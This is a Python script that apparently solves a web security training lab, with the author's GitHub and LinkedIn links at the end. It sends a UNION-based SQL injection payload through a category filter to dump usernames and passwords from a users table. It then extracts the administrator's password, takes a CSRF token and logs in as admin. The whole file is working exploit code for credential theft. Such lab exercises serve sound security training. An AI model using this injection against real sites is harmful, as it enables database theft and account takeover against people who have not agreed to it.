import requests
import re
import sys


class LabSolver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.session = requests.Session()
        self.username = None
        self.password = None
        self.csrf = None

    def retrieve_admin_credentials_using_sql_injection(self):
        payload = 'filter?category=Lifestyle\' UNION SELECT username, password FROM users--'
        response = self.session.get(self.lab_url + payload)
        self.username = 'administrator'
        self.password = re.findall('<td>(.*)</td>', response.text)[2]

    def get_csrf_token(self):
        response = self.session.get(self.lab_url + 'login')
        self.csrf = re.search('value="(.*)"', response.text).group(1)

    def sign_in_as_admin(self):
        data = {
            'csrf': self.csrf,
            'username': self.username,
            'password': self.password
        }
        self.session.post(self.lab_url + 'login',  data=data)

    def check_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def solve(self):
        self.retrieve_admin_credentials_using_sql_injection()
        self.get_csrf_token()
        self.sign_in_as_admin()
        self.check_solution()


solver = LabSolver(sys.argv[1])
solver.solve()
